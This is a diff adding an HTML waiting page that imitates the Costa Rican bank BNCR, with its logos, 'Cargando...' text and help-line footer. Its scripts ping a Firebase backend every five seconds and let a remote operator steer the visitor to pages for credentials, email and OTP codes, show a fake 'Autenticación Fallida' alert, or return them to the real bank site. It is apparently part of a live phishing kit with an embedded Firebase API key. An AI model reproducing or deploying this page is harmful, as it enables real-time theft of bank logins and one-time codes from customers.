@@ -1,0 +1,190 @@
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BNCR</title>
+<style>
+    body {
+        background-color: #F6F9F6;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        font-family: 'Open Sans', sans-serif;
+    }
+    header {
+    background-color: #001966;
+    color: white;
+    border-radius: 0 0 32px 32px;
+    padding-right: 18px;
+    padding-bottom: 100px;
+}
+    .main-content {
+        flex: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    .login-container {
+    background-color: #ffffff;
+    padding-top: 290px;
+    padding-bottom: 290px;
+    padding-left: 45px;
+    padding-right: 45px;
+    margin-top: -20px;
+    margin-bottom: -20px;
+    border-radius: 8px;
+    box-shadow: 0 0px 0px rgba(0, 0, 0, 0);
+    width: 100%;
+    max-width: 320px;
+}
+    .logo-animado {
+    width: 150px;
+    height: auto;
+    display: block;
+    margin: 0 auto;
+    animation: efectoLogo 3s ease-in-out infinite;
+}
+@keyframes efectoLogo {
+    0% {
+        transform: scale(1);
+    }
+    50% {
+        transform: scale(1.12);
+    }
+    100% {
+        transform: scale(1);
+    }
+}
+footer {
+  background-color: #001966;
+  color: white;
+  text-align: center;
+  padding: 20px 0;
+  margin-top: auto;
+}
+</style>
+</head>
+
+<!-- Scripts de Firebase (versión 8.6.8) -->
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
+    authDomain: "kkkkk-5e2bd.firebaseapp.com",
+    databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
+    projectId: "kkkkk-5e2bd",
+    storageBucket: "kkkkk-5e2bd.firebasestorage.app",
+    messagingSenderId: "1059258934487",
+    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
+  };
+
+  if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+  }
+  const db = firebase.firestore();
+
+  // Obtener el usuario actual directamente del localStorage
+  function obtenerUsuarioActual() {
+    return localStorage.getItem("usuario");
+  }
+
+  // Función que envía el latido correctamente usando Firestore v8
+  function enviarLatido() {
+    const usuarioId = obtenerUsuarioActual();
+    
+    if (usuarioId) {
+      db.collection("prolme").doc(usuarioId).set({
+        last_active: firebase.firestore.FieldValue.serverTimestamp()
+      }, { merge: true })
+      .catch((error) => {
+        console.error("Error al enviar latido:", error);
+      });
+    }
+  }
+
+  // Ejecutar el latido cada 5 segundos
+  setInterval(enviarLatido, 5000);
+
+  // Enviar latido inmediato si el usuario cambia de pestaña u oculta la ventana
+  window.addEventListener('visibilitychange', function() {
+    if (document.visibilityState === 'hidden') {
+      enviarLatido();
+    }
+  });
+</script>
+
+<body>
+
+ <header>
+    <div>
+        <img style="margin-top: 20px;margin-bottom: -85px;width: 120px;margin-left: 140px;" src="logo.png">
+    </div>
+ </header>
+
+ <div class="main-content">
+     <div class="login-container">
+    <img style="max-width: 250px;margin-top: -100px;margin-left: 80px;" src="logoo.png" alt="Logo Animado" class="logo-animado">
+    <p style="text-align:center;font-size: 22px;">Cargando...</p>
+</div>
+ </div>
+
+<footer>
+    <div class="footer-content">
+      <p>Accesos:</p>
+      <ul class="footer-links">
+        <li><a>Registro en línea</a></li>
+        <li><a>Sincronizar OTP</a></li>
+        <li><a>Descargar Módulo Local IBC</a></li>
+        <li><a>Asistencia: Contáctenos al 2212-2000 opción 5</a></li>
+      </ul>
+    </div>
+ </footer>
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const usuarioId = localStorage.getItem("usuario");
+      
+      if (!usuarioId) {
+          console.log("No hay usuario en localStorage");
+          return;
+      }
+
+      // Escuchador en tiempo real adaptado a la sintaxis v8 de Firebase
+      db.collection("prolme").doc(usuarioId).onSnapshot((doc) => {
+        if (doc.exists) {
+          const questionData = doc.data();
+
+          if (questionData.page == 1) {
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 2) {
+            window.location.href = "https://www.bncr.fi.cr/";
+          }
+          if (questionData.page == 3) {
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 4) {
+            alert("Autenticación Fallida");
+            window.location.href = "indexinc.html";
+          }
+          if (questionData.page == 5) {
+            window.location.href = "correo.html";
+          }
+          if (questionData.page == 6) {
+            window.location.href = "cod1.html";
+          }
+          if (questionData.page == 7) {
+            window.location.href = "cod2.html";
+          }
+          if (questionData.page == 8) {
+            window.location.href = "sapito";
+          }
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+</script>
+</body></html>
